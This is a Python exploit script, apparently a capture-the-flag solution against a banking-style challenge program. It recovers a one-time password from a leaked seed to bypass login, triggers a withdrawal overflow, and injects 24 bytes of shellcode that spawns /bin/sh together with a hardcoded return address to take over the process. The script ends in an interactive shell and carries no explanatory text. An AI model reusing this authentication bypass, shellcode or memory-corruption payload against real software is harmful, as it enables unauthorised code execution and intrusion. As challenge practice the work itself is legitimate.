import math
import struct
import interact


## OTP calculator
MAGIC = 0x3059b9c1

def generate(seed):
    seed32 = seed & 0xFFFFFFFF
    out = []

    for i in range(8):
        
        shifted = MAGIC >> (i * 2)
        low_byte = shifted & 0xFF
        x = (low_byte ^ seed32) & 0xFFFFFFFF
        x_signed = x - 0x100000000 if x & 0x80000000 else x
        rem = int(math.fmod(x_signed, 9))   # range [-8, 8]
        out.append(chr((rem + 0x31) & 0xFF))
    return "".join(out)

def session_repeatation():
    p.readuntil('Enter choice:')
    p.sendline('5')
    p.readuntil('Enter choice:')
    p.sendline('2')
    data = p.readuntil('Press enter to continue...')
    print(data)
    p.sendline('')
    
## Interacting
p = interact.Process()


## OTP bypass
data = p.readuntil(")")
seed = int((data[-11:-1]))
x = p.readuntil("\n")
login_pass = generate(seed)
print(login_pass)
p.sendline(login_pass)

## Withdrawal overflow
p.readuntil('Enter choice:')
p.sendline('1')
p.readuntil('Enter choice:')
p.sendline('10000')

## Session Flow 
p.readuntil('Press enter to continue...')
p.sendline('')

for i in range(5):
    session_repeatation()

## Session Transaction
# Exactly 24 bytes. No 0x3b. Pops /bin/sh.
shellcode = b"\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3a\x58\xff\xc0\x99\x0f\x05"
ret_address = struct.pack('Q',0x7FFFFFFFC5FF)
payload = shellcode+ret_address
p.readuntil('Enter choice:')
p.sendline('4')
p.readuntil('(y/N)')
p.sendline('y')
p.readuntil('ENTER SESSION INDEX: ')
p.sendline('5')
p.readuntil('ENTER CUSTOM TRANSACTION:')
p.sendline(payload)


p.interactive()